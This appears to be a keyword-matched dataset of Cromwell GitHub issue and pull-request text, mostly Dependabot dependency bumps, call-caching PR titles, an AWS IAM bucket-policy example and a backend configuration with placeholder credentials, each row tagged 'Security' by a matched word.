Security,Brand new version of Cromwell authentication process to JES.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/225:30,authenticat,authentication,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/225,1,['authenticat'],['authentication']
Security,Bring in validation messages from WDL4S. Closes #2211,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2214:9,validat,validation,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2214,1,['validat'],['validation']
Security,Bringing validation code to ValidateActor. Closes #488,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/522:9,validat,validation,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/522,2,"['Validat', 'validat']","['ValidateActor', 'validation']"
Security,"Bumps [jackson-databind](https://github.com/FasterXML/jackson) from 2.11.1 to 2.12.6.1.; <details>; <summary>Commits</summary>; <ul>; <li>See full diff in <a href=""https://github.com/FasterXML/jackson/commits"">compare view</a></li>; </ul>; </details>; <br />. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=com.fasterxml.jackson.core:jackson-databind&package-manager=maven&previous-version=2.11.1&new-version=2.12.6.1)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6743:534,secur,security-vulnerabilities,534,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6743,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps [jackson-databind](https://github.com/FasterXML/jackson) from 2.13.2.2 to 2.13.4.1.; <details>; <summary>Commits</summary>; <ul>; <li>See full diff in <a href=""https://github.com/FasterXML/jackson/commits"">compare view</a></li>; </ul>; </details>; <br />. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=com.fasterxml.jackson.core:jackson-databind&package-manager=maven&previous-version=2.13.2.2&new-version=2.13.4.1)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6935:538,secur,security-vulnerabilities,538,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6935,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps [jackson-databind](https://github.com/FasterXML/jackson) from 2.13.4.1 to 2.13.4.2.; <details>; <summary>Commits</summary>; <ul>; <li>See full diff in <a href=""https://github.com/FasterXML/jackson/commits"">compare view</a></li>; </ul>; </details>; <br />. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=com.fasterxml.jackson.core:jackson-databind&package-manager=maven&previous-version=2.13.4.1&new-version=2.13.4.2)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). You can trigger a rebase of this PR by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7110:538,secur,security-vulnerabilities,538,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7110,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps [junit](https://github.com/junit-team/junit4) from 4.13 to 4.13.1.; <details>; <summary>Release notes</summary>; <p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>; <blockquote>; <h2>JUnit 4.13.1</h2>; <p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.1.md"">release notes</a> for details.</p>; </blockquote>; </details>; <details>; <summary>Changelog</summary>; <p><em>Sourced from <a href=""https://github.com/junit-team/junit4/blob/main/doc/ReleaseNotes4.13.1.md"">junit's changelog</a>.</em></p>; <blockquote>; <h2>Summary of changes in version 4.13.1</h2>; <h1>Rules</h1>; <h3>Security fix: <code>TemporaryFolder</code> now limits access to temporary folders on Java 1.7 or later</h3>; <p>A local information disclosure vulnerability in <code>TemporaryFolder</code> has been fixed. See the published <a href=""https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"">security advisory</a> for details.</p>; <h1>Test Runners</h1>; <h3>[Pull request <a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1669"">#1669</a>:](<a href=""https://github-redirect.dependabot.com/junit-team/junit/pull/1669"">junit-team/junit#1669</a>) Make <code>FrameworkField</code> constructor public</h3>; <p>Prior to this change, custom runners could make <code>FrameworkMethod</code> instances, but not <code>FrameworkField</code> instances. This small change allows for both now, because <code>FrameworkField</code>'s constructor has been promoted from package-private to public.</p>; </blockquote>; </details>; <details>; <summary>Commits</summary>; <ul>; <li><a href=""https://github.com/junit-team/junit4/commit/1b683f4ec07bcfa40149f086d32240f805487e66""><code>1b683f4</code></a> [maven-release-plugin] prepare release r4.13.1</li>; <li><a href=""https://github.com/junit-team/junit4/commit/ce6ce3aadc070db2902698fe0d3dc6729cd631f2""><code>ce6ce3a</code></a> Draft 4.13.1 ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5941:690,Secur,Security,690,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5941,4,"['Secur', 'access', 'secur']","['Security', 'access', 'security']"
Security,"Bumps log4j-api from 2.13.3 to 2.15.0. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=org.apache.logging.log4j:log4j-api&package-manager=maven&previous-version=2.13.3&new-version=2.15.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); - `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language; - `@de",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6586:302,secur,security-vulnerabilities,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6586,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps log4j-api from 2.13.3 to 2.16.0. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=org.apache.logging.log4j:log4j-api&package-manager=maven&previous-version=2.13.3&new-version=2.16.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); - `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language; - `@de",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6591:302,secur,security-vulnerabilities,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6591,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps log4j-api from 2.16.0 to 2.17.0. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=org.apache.logging.log4j:log4j-api&package-manager=maven&previous-version=2.16.0&new-version=2.17.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); - `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language; - `@de",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6594:302,secur,security-vulnerabilities,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6594,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps log4j-api from 2.17.0 to 2.17.1. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=org.apache.logging.log4j:log4j-api&package-manager=maven&previous-version=2.17.0&new-version=2.17.1)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); - `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language; - `@de",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6639:302,secur,security-vulnerabilities,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6639,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps log4j-core from 2.13.3 to 2.15.0. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=org.apache.logging.log4j:log4j-core&package-manager=maven&previous-version=2.13.3&new-version=2.15.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); - `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language; - `@",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6587:304,secur,security-vulnerabilities,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6587,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps log4j-core from 2.13.3 to 2.16.0. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=org.apache.logging.log4j:log4j-core&package-manager=maven&previous-version=2.13.3&new-version=2.16.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); - `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language; - `@",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6592:304,secur,security-vulnerabilities,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6592,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps log4j-core from 2.16.0 to 2.17.0. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=org.apache.logging.log4j:log4j-core&package-manager=maven&previous-version=2.16.0&new-version=2.17.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); - `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language; - `@",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6595:304,secur,security-vulnerabilities,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6595,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"Bumps log4j-core from 2.17.0 to 2.17.1. [![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=org.apache.logging.log4j:log4j-core&package-manager=maven&previous-version=2.17.0&new-version=2.17.1)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores). Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`. [//]: # (dependabot-automerge-start); [//]: # (dependabot-automerge-end). ---. <details>; <summary>Dependabot commands and options</summary>; <br />. You can trigger Dependabot actions by commenting on this PR:; - `@dependabot rebase` will rebase this PR; - `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it; - `@dependabot merge` will merge this PR after your CI passes on it; - `@dependabot squash and merge` will squash and merge this PR after your CI passes on it; - `@dependabot cancel merge` will cancel a previously requested merge and block automerging; - `@dependabot reopen` will reopen this PR if it is closed; - `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually; - `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself); - `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself); - `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language; - `@",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6640:304,secur,security-vulnerabilities,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6640,2,['secur'],"['security-updates', 'security-vulnerabilities']"
Security,"By default, the CloudFormation template will only give access to the bucket you specified at creation time as well as `gatk-test-data/*` and `broad-references/*`. To be able to access data in additional buckets you would need to grant `s3.*` to these resources through a policy that grants access to the bucket that you attach to `Cromwell-ServerStac-Ec2InstanceRole` (The exact name of the role depends on the name you gave the stack and some random characters cloud formation adds to prevent name collisions). In addition you need to add the same (or equivalent) policy to `GenomicsW-GenomicsEnvBatchInstance` role. This grants the batch worker EC2s access to the bucket. The policy would look something like:; ```json; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Action"": [; ""s3:*""; ],; ""Resource"": [; ""arn:aws:s3:::my-bucket-name"",; ""arn:aws:s3:::my-bucket-name/*""; ],; ""Effect"": ""Allow"",; ""Sid"": ""S3BucketAllowAllObjectOps""; }; ]; }; ```. In the `GenomicsEnvBatchJobRole` you would also need to attach a more restricted policy similar to:. ```json; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Action"": [; ""s3:Delete*"",; ""s3:PutBucket*""; ],; ""Resource"": ""arn:aws:s3:::my-bucket-name"",; ""Effect"": ""Deny""; },; {; ""Action"": [; ""s3:ListBucket*""; ],; ""Resource"": ""arn:aws:s3:::my-bucket-name"",; ""Effect"": ""Allow""; },; {; ""Action"": [; ""s3:*""; ],; ""Resource"": ""arn:aws:s3:::my-bucket-name/*"",; ""Effect"": ""Allow""; }; ]; } ; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-611697894:55,access,access,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-611697894,4,['access'],['access']
Security,"CFCD208495D565EF66E7DFF9F98764DA"",; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327""; },; ""output expression"": {; ""File output_greeting"": ""DFC652723D8EBD4BB25CAC21431BB6C0""; },; ""input count"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""backend name"": ""2A2AB400D355AC301859E4ABB5432138"",; ""command template"": ""AFAC58B849BD67585A857F538B8E92F6""; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hit"": false,; ""result"": ""Cache Miss""; },; ```. ```; # simple sge apptainer conf (modified from the slurm one); #; workflow-options; {; workflow-log-dir: ""cromwell-workflow-logs""; workflow-log-temporary: false; workflow-failure-mode: ""ContinueWhilePossible""; default; {; workflow-type: WDL; workflow-type-version: ""draft-2""; }; }. database {; # Store metadata in a file on disk that can grow much larger than RAM limits.; metadata {; profile = ""slick.jdbc.MySQLProfile$""; db {; url = ""jdbc:mysql:<dburl>?rewriteBatchedStatements=true""; driver = ""com.mysql.cj.jdbc.Driver""; user = ""<user>""; password = ""<pass>"" ; connectionTimeout = 5000; }; }; }. call-caching; {; enabled = true; invalidate-bad-cache-result = true; }. docker {; hash-lookup {; enabled = true; }; }. backend {; default = sge; providers {. ; sge {; 	actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; #concurrent-job-limit = 5. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. # exit-code-timeout-seconds = 120. runtime-attributes = """"""; String time = ""11:00:00""; Int cpu = 4; Float? memory_gb; String sge_queue = ""hammer.q""; String? sge_project; String? docker; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:2029,password,password,2029,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,1,['password'],['password']
Security,CROM-6872 Temporarily disable ssh access test,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6728:34,access,access,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6728,1,['access'],['access']
Security,CWL input file format validation. Closes #3569,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3567:22,validat,validation,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3567,1,['validat'],['validation']
Security,CWL static type validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3046:16,validat,validation,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3046,1,['validat'],['validation']
Security,CWL: Validate input input files against OWL/RDF,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3569:5,Validat,Validate,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3569,1,['Validat'],['Validate']
Security,Call cache capoeira for 1.0 (plus ensure task hashes match draft-2),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3653:46,hash,hashes,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3653,1,['hash'],['hashes']
Security,Call caching database access wired through to engine. Closes #1224,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1268:22,access,access,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1268,1,['access'],['access']
Security,Call caching hashes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1307:13,hash,hashes,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1307,1,['hash'],['hashes']
Security,Call caching hashes (complete!),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1303:13,hash,hashes,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1303,1,['hash'],['hashes']
Security,Call caching hashing rebased on Call Cache reading,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1291:13,hash,hashing,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1291,1,['hash'],['hashing']
Security,Call caching hashing strategies,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1487:13,hash,hashing,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1487,1,['hash'],['hashing']
Security,Call caching isn't working in V25 with docker hashes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2229:46,hash,hashes,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2229,1,['hash'],['hashes']
